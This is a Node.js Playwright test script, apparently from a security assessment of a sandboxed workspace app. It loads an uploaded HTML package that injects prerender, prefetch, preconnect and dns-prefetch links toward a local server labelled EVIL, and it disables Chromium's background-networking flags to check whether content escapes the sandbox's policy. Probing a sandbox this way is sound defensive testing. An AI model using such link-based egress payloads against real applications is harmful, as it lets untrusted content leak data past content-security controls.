// New-input (b): remove Playwright's networking-suppressing default args; retest prerender + preconnect + dns-prefetch.
const fs=require('node:fs'),path=require('node:path'),http=require('node:http'),net=require('node:net');
const {chromium}=require('playwright'); const L=require('./lib-a1-copy.cjs');
const EVIL='http://localhost:4661';
const mute=`window.addEventListener('securitypolicyviolation',e=>{(window.__v=window.__v||[]).push(e.effectiveDirective)},true);`;
const mk=(rel,extra='')=>`{const l=document.createElement('link');l.rel='${rel}';${extra}l.href='${EVIL.replace('http://','http://').replace('4661','4661')}/${rel}?d=1';document.head.append(l);}`;
const html=`<!doctype html><html><body><h1>flags</h1><script>${mute}
{const l=document.createElement('link');l.rel='prerender';l.href='${EVIL}/prerender?d=1';document.head.append(l);}
{const l=document.createElement('link');l.rel='preconnect';l.href='http://localhost:4662';document.head.append(l);}
{const l=document.createElement('link');l.rel='dns-prefetch';l.href='http://localhost:4662';document.head.append(l);}
{const l=document.createElement('link');l.rel='prefetch';l.href='${EVIL}/prefetch?d=1';document.head.append(l);}
<\/script></body></html>`;
(async()=>{
 const site=await L.startSite(4660);
 const http_log=[]; const evil=http.createServer((req,res)=>{http_log.push({url:req.url.slice(0,40),purpose:req.headers['sec-purpose']||null});res.writeHead(200,{'content-type':'text/html'});res.end('x');});
 await new Promise(r=>evil.listen(4661,'0.0.0.0',r));
 const tcp=await L.startTcp(4662); // preconnect/dns target
 const out={}; let browser;
 try{
  // Remove networking-suppression default args
  const removed=['--disable-background-networking','--disable-background-timer-throttling','--disable-backgrounding-occluded-windows','--disable-renderer-backgrounding','--disable-ipc-flooding-protection'];
  browser=await chromium.launch({channel:'chromium',ignoreDefaultArgs:removed});
  out.flagsRemoved=removed;
  const page=await (await browser.newContext()).newPage();
  await L.openWorkspace(page,'http://127.0.0.1:4660/');
  await L.openFile(page,L.makePackage(html),'f.zip');
  await page.locator('[data-pres-start-button]').waitFor({state:'visible',timeout:15000});
  await page.locator('[data-pres-start-button]').click();
  await L.sleep(4000);
  const s=await L.dialogState(page); const frame=L.appFrame(page);
  out.hostStatus=s.status;
  out.httpReceived=http_log;
  out.tcpConnections=tcp.log.map(e=>({remote:e.remote,first:e.first.slice(0,40)}));
  out.violations=frame?await frame.evaluate(()=>window.__v||[]).catch(()=>null):null;
 } finally { if(browser)await browser.close(); await site.close(); evil.closeAllConnections?.(); await new Promise(r=>evil.close(r)); await tcp.close(); fs.writeFileSync(path.join(__dirname,'logs','v-flags.json'),JSON.stringify(out,null,2)); }
 console.log(JSON.stringify(out,null,1));
})().catch(e=>{console.error(e);process.exit(1)});
